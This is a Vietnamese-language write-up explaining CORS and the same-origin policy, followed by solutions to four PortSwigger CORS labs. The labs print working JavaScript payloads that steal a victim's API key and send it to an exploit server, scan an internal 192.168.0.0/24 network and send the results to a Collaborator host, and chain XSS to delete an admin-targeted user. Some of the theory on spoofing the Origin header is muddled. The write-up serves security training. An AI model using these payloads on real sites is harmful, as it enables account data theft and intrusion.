# Cross-origin resource sharing (CORS)

## Khái niệm & Khai thác & Tác hai & Phòng tránh

- Trước hết, CORS là cơ chế của brower nhằm kích hoạt việc truy cập có kiểm soát vào tài nguyên nằm bên ngoài một domain xác định. CORS giúp mở rộng và tăng cường độ linh hoạt cho Same-Origin Policy – SOP. Và việc này cũng dẫn đến nguy cơ Cross-Domain attack nếu CORS policy của website được cấu hình và thực thi không chuẩn mực. Cũng cần nhấn mạnh CORS không phải là giải pháp phòng chống các đòn Cross-Origin attack như Cross-Site Request Forgery – CSRF.

SOP là một dạng restrictive cross-origin specification (tôi tạm dịch là đặc tính kiểm soát cross-origin) nhằm giới hạn khả năng website tương tác với các tài nguyên bên ngoài domain nguồn. Mục tiêu của SOP là nhằm ngăn chặn các tương tác độc hại giữa các domain (ví dụ một website tìm cách chôm chỉa dữ liệu nhạy cảm từ một website khác).

- SOP là cơ chế bảo mật của web browser nhằm ngăn chặn các websites tấn công lẫn nhau. Về cơ bản, SOP sẽ ngăn ngừa script từ một origin nào đấy truy cập dữ của một origin khác. Origin trong ngữ cảnh này sẽ bao gồm URI scheme, domain và port number.

![image](https://hackmd.io/_uploads/HkQ8XoMpa.png)

![image](https://hackmd.io/_uploads/rJFYN5f66.png)

Chính sách cùng nguồn gốc

- Chính sách cùng nguồn gốc là một đặc tả hạn chế về nhiều nguồn gốc nhằm giới hạn khả năng trang web tương tác với các tài nguyên bên ngoài miền nguồn. Chính sách cùng nguồn gốc đã được xác định từ nhiều năm trước để ứng phó với các tương tác giữa các miền độc hại tiềm ẩn, chẳng hạn như một trang web đánh cắp dữ liệu riêng tư từ một trang web khác. Nó thường cho phép một miền đưa ra yêu cầu cho các miền khác nhưng không truy cập được các phản hồi.

Lỗ hổng phát sinh từ các vấn đề cấu hình CORS
Nhiều trang web hiện đại sử dụng CORS để cho phép truy cập từ tên miền phụ và bên thứ ba đáng tin cậy. Việc triển khai CORS của họ có thể có sai sót hoặc quá nhẹ nhàng để đảm bảo rằng mọi thứ đều hoạt động và điều này có thể dẫn đến các lỗ hổng có thể bị khai thác.

![image](https://hackmd.io/_uploads/H1wd7jfT6.png)

Tiêu đề ACAO do máy chủ tạo từ tiêu đề Origin do khách hàng chỉ định
Một số ứng dụng cần cung cấp quyền truy cập vào một số miền khác. Việc duy trì danh sách các miền được phép đòi hỏi nỗ lực liên tục và bất kỳ sai sót nào cũng có nguy cơ phá vỡ chức năng. Vì vậy, một số ứng dụng sử dụng con đường dễ dàng để cho phép truy cập từ bất kỳ miền nào khác một cách hiệu quả.

Một cách để thực hiện điều này là đọc tiêu đề Origin từ các yêu cầu và bao gồm tiêu đề phản hồi cho biết rằng nguồn gốc yêu cầu được cho phép

![image](https://hackmd.io/_uploads/Syzb5wbTp.png)

Origin Header Security attack là một loại tấn công trong lĩnh vực bảo mật web nhằm xâm phạm tính toàn vẹn và bảo mật của trường “Origin” trong tiêu đề HTTP request. Trường “Origin” chứa thông tin về nguồn gốc của yêu cầu HTTP, bao gồm giao thức, tên miền và cổng.

Trong một Origin Header Security attack, kẻ tấn công sẽ thay đổi hoặc giả mạo trường “Origin” trong yêu cầu HTTP. Điều này có thể được thực hiện bằng cách thay đổi giá trị của trường “Origin” trong tiêu đề request hoặc thông qua các phương thức khác như JavaScript hoặc các công cụ tùy chỉnh.

### Khai thác

Trong tấn công Origin Header Security, kẻ tấn công thực hiện các hành động để thay đổi hoặc giả mạo trường “Origin” trong yêu cầu HTTP. Điều này có thể được thực hiện thông qua các phương thức sau:

- Thay đổi trường “Origin” trong tiêu đề request: Kẻ tấn công có thể thay đổi giá trị của trường “Origin” trong tiêu đề của yêu cầu HTTP. Bằng cách này, họ có thể giả mạo thông tin về nguồn gốc của yêu cầu và tạo ra một giá trị “Origin” không hợp lệ hoặc gian lận.
- Sử dụng mã JavaScript: Kẻ tấn công có thể sử dụng mã JavaScript để thay đổi giá trị trường “Origin” trên trình duyệt của người dùng. Điều này có thể được thực hiện bằng cách thêm mã JavaScript độc hại vào trang web hoặc chèn mã thông qua các phương thức tương tác với trình duyệt, chẳng hạn như JavaScript injection.
- Các công cụ tùy chỉnh: Kẻ tấn công có thể sử dụng các công cụ tùy chỉnh hoặc công cụ mạng để thay đổi trường “Origin” trong yêu cầu HTTP. Các công cụ này cho phép kẻ tấn công thay đổi giá trị “Origin” theo ý muốn và gửi yêu cầu đã được sửa đổi đến máy chủ.

Mục tiêu của tấn công Origin Header Security là thay đổi hoặc giả mạo trường “Origin” để xâm nhập và kiểm soát các tài khoản người dùng khác, lợi dụng quyền truy cập không hợp lệ, hoặc thực hiện các hành động độc hại trên hệ thống.

Bước 1: Máy khách web gửi yêu cầu lấy tài nguyên từ một Domain khác.

```http!
GET /resources/public-data/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
Referer: http://foo.example/examples/access-control/simpleXSInvocation.html
Origin: http://foo.example

[Request Body]
```

Máy khách web cho máy chủ biết miền nguồn của nó bằng cách sử dụng tiêu đề yêu cầu HTTP “Origin”.

Bước 2: Ứng dụng web phản hồi yêu cầu.

```http!
HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 00:23:53 GMT
Server: Apache/2.0.61
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: application/xml
Access-Control-Allow-Origin: *

[Response Body]
```

Ứng dụng web thông báo cho máy khách web về các domain được phép sử dụng tiêu đề phản hồi HTTP Access-Control-Allow-Origin. Tiêu đề có thể chứa một dấu ‘\*’ để chỉ ra rằng tất cả các miền đều được phép HOẶC một domain được chỉ định để biểu thị domain được phép đã chỉ định.

### Tác hại

Tấn công Origin Header Security có thể gây ra những tác hại nghiêm trọng cho hệ thống và người dùng, bao gồm:

- Đánh cắp thông tin cá nhân: Kẻ tấn công có thể sử dụng tấn công Origin Header Security để đánh cắp thông tin cá nhân của người dùng, chẳng hạn như tên đăng nhập, mật khẩu, thông tin tài khoản ngân hàng, thông tin thẻ tín dụng và các dữ liệu quan trọng khác.
- Tiến hành tấn công đánh cắp danh tính (identity theft): Bằng cách giả mạo trường “Origin”, kẻ tấn công có thể xâm nhập vào các tài khoản người dùng khác, chiếm đoạt danh tính của họ và thực hiện các hành động độc hại dưới danh nghĩa của người dùng đó.
- Thực hiện các hành động độc hại: Kẻ tấn công có thể sử dụng tấn công Origin Header Security để thực hiện các hành động độc hại trên hệ thống, như thay đổi dữ liệu, xóa hoặc tạo mới các tài khoản, thực hiện các giao dịch gian lận hoặc tấn công khác nhằm làm suy yếu hoặc kiểm soát hệ thống.
- Mở cánh cửa cho các tấn công khác: Tấn công Origin Header Security có thể tạo điều kiện thuận lợi cho các tấn công khác, chẳng hạn như Cross-Site Scripting (XSS) hoặc Cross-Site Request Forgery (CSRF), bằng cách thay đổi hoặc giả mạo thông tin “Origin” để làm lừa các cơ chế bảo mật của trình duyệt và máy chủ.
  Tóm lại, tấn công Origin Header Security có thể dẫn đến việc đánh cắp thông tin, chiếm đoạt danh tính, thực hiện các hành động độc hại và làm suy yếu hệ thống. Do đó, việc bảo vệ chặt chẽ và áp dụng các biện pháp phòng ngừa là rất quan trọng để đảm bảo an toàn cho hệ thống và người dùng.

### Phòng tránh

- Rủi ro ở đây là máy khách web có thể đặt bất kỳ giá trị nào vào tiêu đề HTTP yêu cầu Origin để buộc ứng dụng web cung cấp cho nó nội dung tài nguyên đích. Trong trường hợp là ứng dụng web Trình duyệt, giá trị tiêu đề do trình duyệt quản lý nhưng có thể sử dụng một “ứng dụng khách web” khác (như Curl / Wget / Burp suite /…) để thay đổi / ghi đè giá trị tiêu đề “Origin”. Vì lý do này, bạn không nên sử dụng tiêu đề Origin để xác thực các yêu cầu đến từ trang web.

## 1. Lab: CORS vulnerability with basic origin reflection

link: https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack

### Đề bài

![image](https://hackmd.io/_uploads/SyOx5ifaT.png)

### Phân tích

- Trang web này có cấu hình CORS không an toàn ở chỗ nó tin cậy mọi nguồn gốc.
- Sau khi đăng nhập với account cho sẵn, tại trang /my-account ta xem được tên username kèm theo apikey.

![image](https://hackmd.io/_uploads/S1m69jzTT.png)

- Trong đó, apikey được trích xuất từ /accountDetails bằng đoạn script như hình.

![image](https://hackmd.io/_uploads/rk9ksifTT.png)

![image](https://hackmd.io/_uploads/HJj-jjMaa.png)

Kiểm tra request đến /accountDetails thì nó trả về thông tin user chứa apikey dựa theo session cookie và có header `Access-Control-Allow-Credentials: true` nên có thể suy ra nó hỗ trợ CORS.

![image](https://hackmd.io/_uploads/r1MDiof6a.png)

Nếu thêm Origin bất kì http://abc.com vào request, có thể thấy response có thêm Access-Control-Allow-Origin: http://abc.com → server trust origin từ request.

![image](https://hackmd.io/_uploads/HytsisGT6.png)

### Khai thác

mình dùng payload sau

```javascript
<script>
    fetch('//<LAB-ID>.web-security-academy.net/accountDetails', {
        credentials:'include'
    })
    .then(r => r.json())
    .then(j => fetch('//exploit-<EXPLOIT-ID>.exploit-server.net/?apiKey=' + j.apikey))
</script>
```

khi victim truy cập vào exploit server của mình đoạn script trong đó sẽ lấy apikey từ `/accountDetails` của nạn nhân và sau đó gửi nó về exploit server của mình

![image](https://hackmd.io/_uploads/SkjjTjfaa.png)

store và delivery cho victim và mình vào xem log được apikey là **nVgP0vg2JhZlkE2LUU1EoxpHNGBnKQC6**

![image](https://hackmd.io/_uploads/r1C5asMpa.png)

đem submit và mình solve được lab này

![image](https://hackmd.io/_uploads/S1vx0sGp6.png)

## 2. Lab: CORS vulnerability with trusted null origin

link: https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack

### Đề bài

![image](https://hackmd.io/_uploads/ryQtAoMa6.png)

### Phân tích

- Trang web này có cấu hình CORS không an toàn ở chỗ nó tin tưởng vào nguồn gốc "null".
- Tương tự bài trên, apikey của user cũng được trích xuất thông qua response từ /accountDetails.

![image](https://hackmd.io/_uploads/S1f4J2zap.png)

Xuất hiện header Access-Control-Allow-Credentials: true nên có thể suy ra server hỗ trợ CORS.

![image](https://hackmd.io/_uploads/S1dDkhfa6.png)

Nếu thêm Origin bất kì http://abc.com vào request thì thấy server không trust origin bất kì từ request.

![image](https://hackmd.io/_uploads/Bkx6knGT6.png)

Tuy nhiên, khi thêm header Origin: null thì thấy response có header Access-Control-Allow-Origin: null. → server cấu hình cho phép Origin: null.

![image](https://hackmd.io/_uploads/ryJAJ3G6T.png)

### Khai thác

- mình dùng payload với iframe sanbox như sau rồi đẩy vô phần body của Exploit Server.

```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="data:text/html,<script>
    fetch('//<LAB-ID>.web-security-academy.net/accountDetails', {
        credentials:'include'
    }).then(r => r.json())
      .then(j => fetch('//exploit-<EXPLOIT-ID>.exploit-server.net/?apiKey=' + j.apikey))</script>">
</iframe>
```

- Cái iframe sanbox sẽ tạo ra null origin reques

- Sau đó mình có thể chọn Store và View exploit để kiểm hàng trong Access log để xác nhận sự hiện diện của API Key là **rzsg171IPMX6uSjQIoe4Oe3kwvm3fAh6**

![image](https://hackmd.io/_uploads/SkGzMnzap.png)

đem đi sunmit và mình solve được lab này

![image](https://hackmd.io/_uploads/ryySz3M6T.png)

## 3. Lab: CORS vulnerability with trusted insecure protocols

link: https://portswigger.net/web-security/cors/lab-breaking-https-attack

### Đề bài

![image](https://hackmd.io/_uploads/HkeFG2z66.png)

### Phân tích

- Trang web này có cấu hình CORS không an toàn ở chỗ nó tin cậy tất cả các tên miền phụ bất kể giao thức.

- tương tự các bài trên mình đăng nhập và thấy trang web hỗ trợ CORS

![image](https://hackmd.io/_uploads/HyF8mnf6a.png)

nhưng trang web chỉ cho phép cùng domain hoặc từ subdomain

![image](https://hackmd.io/_uploads/BJuT73Gpp.png)

![image](https://hackmd.io/_uploads/ByvkEhMaa.png)

Một điểm chú ý là khi xem post sản phẩm bất kì thì xuất hiện chức năng Check stock, khi click sẽ thực hiện request đến 1 subdomain `http://stock.<LAB-DOMAIN>/?productId=X&storeId=Y` để trả về số sản phẩm còn trong kho.

![image](https://hackmd.io/_uploads/B1nHE3zTT.png)

Bây giờ ta sẽ đi tìm cách tấn công làm sao để nạn nhân sẽ request đến /accountDetails từ subdomain `http://stock.<LAB-DOMAIN>` chứ không phải từ exploit-server.

### Khai thác

mình scan trang web với burp suit và thấy được lỗi reflected XSS trả về

![image](https://hackmd.io/_uploads/Hk1FS2Map.png)

![image](https://hackmd.io/_uploads/SJVnShzT6.png)

- Như vậy, bây giờ chỉ cần truyền payload cors attack sau khi URL-encoded vào trường productId và khiến nạn nhân truy cập vào đường dẫn này thì nó sẽ thực thi payload từ subdomain nhờ XSS và request đến /accountDetails. Payload cors attack:

```javascript
<script>
    fetch('https://0aa5000403f87add83078eab00a60075.web-security-academy.net/accountDetails', {
          credentials:'include'
    })
    .then(r => r.json())
    .then(j => fetch('https://exploit-0abd001e03967a84839c8dd301f8001c.exploit-server.net/?apiKey=' + j.apikey))
</script>
```

![image](https://hackmd.io/_uploads/S1tpP2GTa.png)

Tại exploit-server, truyền payload sau:

```javascript
<script>
   document.location = "http://stock.<LAB-DOMAIN>/?productId=<ENCODED-CORS-ATTACK>&storeId=1"
</script>
```

![image](https://hackmd.io/_uploads/S1Rounzap.png)

Sau đó mình có thể chọn Store và View exploit để kiểm hàng trong Access log để xác nhận sự hiện diện của API Key

- và mình được apikey là **3DDjt8SbGJziqYDBHhQVXY3IsKFM0icI**

![image](https://hackmd.io/_uploads/Sk5dunfTp.png)

submit và mình solve được lab này

![image](https://hackmd.io/_uploads/HkO5_3zap.png)

## 4. Lab: CORS vulnerability with internal network pivot attack

link: https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack

### Đề bài

![image](https://hackmd.io/_uploads/ryc5K2f6a.png)

### Phân tích

- Trang web này có cấu hình CORS không an toàn ở chỗ nó tin cậy tất cả nguồn gốc mạng nội bộ.
- Phòng thí nghiệm này yêu cầu nhiều bước để hoàn thành. Để giải quyết bài lab mình cần tạo một số JavaScript để xác định điểm cuối trên mạng cục bộ ( 192.168.0.0/24, cổng 8080) mà sau đó có thể sử dụng để xác định và tạo một cuộc tấn công dựa trên CORS nhằm xóa người dùng. Lab được giải quyết khi bạn xóa người dùng carlos.

### Khai thác

- Ta sẽ sử dụng payload sau để bruteforce tìm địa chỉ internal service port 8080 nằm trong dải 192.168.0.0/24. Nếu tìm được đúng IP thì nó sẽ trả mã nguồn về collaborator mình đang control.

```javascript
<script>
var q = [], collaboratorURL = 'http://lh6a3jy61r4vwcmoze5hj6s34uaky9.oastify.com';

for(i=1;i<=255;i++) {
	q.push(function(url) {
		return function(wait) {
			fetchUrl(url, wait);
		}
	}('http://192.168.0.'+i+':8080'));
}

for(i=1;i<=20;i++){
	if(q.length)q.shift()(i*100);
}

function fetchUrl(url, wait) {
	var controller = new AbortController(), signal = controller.signal;
	fetch(url, {signal}).then(r => r.text().then(text => {
		location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
	}))
	.catch(e => {
		if(q.length) {
			q.shift()(wait);
		}
	});
	setTimeout(x => {
		controller.abort();
		if(q.length) {
			q.shift()(wait);
		}
	}, wait);
}
</script>
```

![image](https://hackmd.io/_uploads/HJpL03Gap.png)

Lưu payload vào exploit-server rồi Deliver exploit to victim. Kết quả địa chỉ IP của internal service cần tìm là `192.168.0.235:8080`.

![image](https://hackmd.io/_uploads/SJJUT2GT6.png)

- Decode mã nguồn trả về ta thấy ứng dụng internal này có form login tại `http://192.168.0.235:8080/login`.

![image](https://hackmd.io/_uploads/rkXkChGap.png)

- Thử login ứng dụng internal bằng payload sau và xem response trả về.

```javascript
<script>
var collaboratorURL = 'http://vutd7wsn1w8itz4bl0yqhbjhm8szgp4e.oastify.com';

function fetchUrl(url) {
	fetch(url).then(r => r.text().then(text => {
		location = collaboratorURL + '?code='+encodeURIComponent(text);
	}))
}

fetchUrl('http://192.168.0.235:8080/login?username=test&password=test');
</script>
```

![image](https://hackmd.io/_uploads/Byhs0nGTa.png)

![image](https://hackmd.io/_uploads/BkCiJpGaT.png)

thấy giá trị của các param username và password đã được điền vào form login

vì chúng ta ko biết tài khoản và mật khẩu của admin nên chúng ta không thể vượt qua cơ chế xác thực này nhưng với XSS thì sẽ khác vì khi chèn được XSS vào từ mạng internal của server nó sẽ hiểu như là đoạn script của server vì cùng origin và bypass được qua cơ chế xác thực

- tiếp theo truyền payload XSS vào `username : "><img src='+collaboratorURL+'?foundXSS=1>`. Nếu XSS thành công thì sẽ có request đến collaborator chứa tham số foundXSS=1.

```javascript
<script>
function xss(url, text, vector) {
	location = url + '/login?username='+encodeURIComponent(vector)+'&password=test';
}

function fetchUrl(url, collaboratorURL){
	fetch(url).then(r => r.text().then(text => {
		xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
	}))
}

fetchUrl("http://192.168.0.235:8080", "http://vutd7wsn1w8itz4bl0yqhbjhm8szgp4e.oastify.com");
</script>
```

Deliver exploit to victim, ta nhận được request như mong muốn → interal endpoint /login bị dính XSS.

![image](https://hackmd.io/_uploads/rJ-B-TMT6.png)

Tận dụng XSS của internal service đó để truy cập trang /admin của ứng dụng hiện tại do ứng dụng trust tất cả các origin từ internal network.
Payload XSS sẽ là load 1 frame của trang /admin và trả mã HTML về collaborator.

```javascript
<script>
function xss(url, text, vector) {
	location = url + '/login?username='+encodeURIComponent(vector)+'&password=test';
}

function fetchUrl(url, collaboratorURL){
	fetch(url).then(r => r.text().then(text => {
		xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
	}))
}

fetchUrl("http://192.168.0.235:8080", "http://vutd7wsn1w8itz4bl0yqhbjhm8szgp4e.oastify.com");
</script>
```

Gửi payload cho nạn nhân qua exploit-server, ta nhận được request trả về chứa mã nguồn HTML trang /admin. Ta thấy có 1 form post đến `/admin/delete` để delete user theo username

![image](https://hackmd.io/_uploads/r1Llf6z6a.png)

![image](https://hackmd.io/_uploads/ByHGG6Mp6.png)

và mình đã truy cập được vào trang quản trị

- bây giờ mình chỉ cần xóa carlos với payload XSS

```javascript
<script>
function xss(url, text, vector) {
	location = url + '/login?username='+encodeURIComponent(vector)+'&password=test';
}

function fetchUrl(url){
	fetch(url).then(r => r.text().then(text => {
		xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
	}))
}

fetchUrl("http://192.168.0.235:8080");
</script>
```

![image](https://hackmd.io/_uploads/B1jaM6fpp.png)

Sau đó mình có thể chọn Store và gửi cho victim ở đây là admin và mình đã solve được lab này

![image](https://hackmd.io/_uploads/SJLpzpG66.png)

<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">

## Tham khảo

- https://websitehcm.com/kiem-tra-lo-hong-bao-mat-cross-origin-resource-sharing-cors/
- https://topdev.vn/blog/cors-la-gi
- https://viblo.asia/p/cors-la-gi-Qbq5Q0j3lD8
- https://writeblabla.com/blog/hieu-sau-ve-csrf-cors-va-xu-ly-o-cap-do-core-mot-cach-an-toan.html
- https://www.youtube.com/watch?v=8G0o3H6GJP4&list=PLaoi7ADVdlKfnlqL6TZVantCKZi-4BDNJ&index=13
